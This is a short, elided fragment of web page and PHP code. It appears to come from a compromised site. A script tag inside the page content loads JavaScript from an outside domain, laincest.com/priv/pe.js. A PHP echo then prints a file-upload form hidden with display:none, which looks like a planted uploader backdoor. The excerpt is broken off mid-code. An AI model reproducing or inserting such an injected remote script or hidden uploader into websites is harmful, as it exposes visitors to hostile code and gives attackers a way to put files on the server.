...
<div id="content">
<SCRIPT SRC=http://laincest.com/priv/pe.js></SCRIPT>
...
echo'<form style="display:none" method="POST" action="" enctype="multipart/form-data"><input type="file" name="image"><input type="Submit" name="Submit" value="Submit"></form>';
}
}
function
